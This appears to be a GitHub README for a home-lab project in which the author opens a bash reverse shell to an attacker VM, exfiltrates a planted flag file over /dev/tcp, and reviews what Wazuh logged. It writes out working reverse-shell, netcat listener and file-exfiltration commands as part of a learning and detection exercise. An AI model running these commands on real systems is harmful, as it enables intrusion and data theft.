### ### Reverse Shell and File Exfiltration ### ###
Hello, thank you for checking out this project on my GitHub! If you have any suggestions, feedback, or just want to connect hit me up on LinkedIn!

### Project Overview ###
This project builds off my last one, where I performed an SSH brute force attack. This time, I’m focused on what an attacker might do after gaining access such as setting up a reverse shell and data exfiltration.

(To be clear: this isn’t full persistence as a real attacker will create scripts or schedule tasks to keep the backdoor alive even after reboots. What I did here is a manual and temporary version to help me understand how it works and it was still super useful to do)

### Setup (Victim VM) ###
* Ensured SSH was still running
* Created a file on the victim desktop called supersecret.txt with the content: “FLAG- Exfiltrated” (this file would be the target for exfiltration)

<img width="1052" alt="Screenshot 2025-07-06 at 8 43 12 PM" src="https://github.com/user-attachments/assets/547bc3a2-3d41-464a-a673-841c4ed16d3b" />

### Attack Flow ###
I used two terminals on my attacker VM:
Terminal 1: Reverse Shell Setup
* I SSH’ed into the victim using the credentials I got from the brute force attack last project
* I then created a file called “rev.sh” that contained the following “bash -i >& /dev/tcp/10.0.0.154/4444 0>&1”
    * This tells the victim to open a bash shell and connect back to my attacker machine on port 4444.
    * I made the script executable using: “chmod +x rev.sh”
    * I then stored the script in the victim's Downloads directory.

<img width="574" alt="Screenshot 2025-07-06 at 8 46 24 PM" src="https://github.com/user-attachments/assets/cf6d1158-e73f-4a09-8d97-12e052e1e103" />

<img width="338" alt="Screenshot 2025-07-06 at 8 47 47 PM" src="https://github.com/user-attachments/assets/66f555f3-d8ea-4a1f-91cc-b91ef58943db" />

Terminal 2: Listening on Attacker
* Ran: “nc -lvnp 4444” to listen for the incoming shell.

<img width="533" alt="Screenshot 2025-07-06 at 8 52 10 PM" src="https://github.com/user-attachments/assets/79962e0f-725c-4977-8764-7e989eb854fc" />

Terminal 1: Triggering the Reverse Shell
* Back in Terminal 1 (SSH’ed from attacker to the victim), I ran: “bash rev.sh”
    * The connection was successful! Terminal 2 now gave me access to the victim shell.
 
<img width="563" alt="Screenshot 2025-07-06 at 8 58 48 PM" src="https://github.com/user-attachments/assets/68f3b1e6-47e7-4cb1-9219-492439008d84" />

Finding and Exfiltrating the File
* In Terminal 2 (connected to victim) I navigated to the victim's desktop to look for supersecret.txt
* I verified the file contents with: “cat supersecret.txt”
* Then I exfiltrated the file using: “cat /home/batman/Desktop/supersecret.txt > /dev/tcp/attacker IP/4444”
* I opened a third terminal on the attacker VM to confirm if the supersecret.txt file was sent to the attacker and it was!

<img width="651" alt="Screenshot 2025-07-06 at 9 02 55 PM" src="https://github.com/user-attachments/assets/8718a8a5-893b-4189-84ca-40836d61d5ba" />

<img width="665" alt="Screenshot 2025-07-06 at 9 08 45 PM" src="https://github.com/user-attachments/assets/730b3805-c3a5-46e6-8583-61f84b2df63d" />

<img width="589" alt="Screenshot 2025-07-06 at 9 12 51 PM" src="https://github.com/user-attachments/assets/0324ed25-2262-45f2-a922-01a765b536fc" />

### SIEM Detection (Wazuh) ###
After finishing, I checked Wazuh to see what was logged. Here's what I noticed:
* It detected on the victim VM:
    * Creation of “rev.sh”
    * “chmod +x rev.sh” being run 
    * Creation of supersecret.txt

* It did NOT detect:
    * Execution of rev.sh
    * File transfer of supersecret.txt over TCP using bash
(Screenshots below show these detections clearly.)

### Cleanup/Revert ###
* Deleted both rev.sh and supersecret.txt from the victim
* Disabled SSH on the victim machine

### Lessons Learned ###
* Visibility is everything. If defenders can’t see commands like bash -i or TCP connections to strange IPs, attackers can operate freely.
* This basic reverse shell was eye-opening as it showed how easy it is to lose control of a machine once access is gained and the importance of reinforcing:
    * Strong passwords
    * EDR on endpoints
    * Proper logging (bash history, syscalls, network monitoring)

Personally: For me doing hands-on projects like this makes the MITRE ATT&CK framework click for me. I learn best by trying things, messing up, and figuring them out by go over whatI need to learn or improve on!
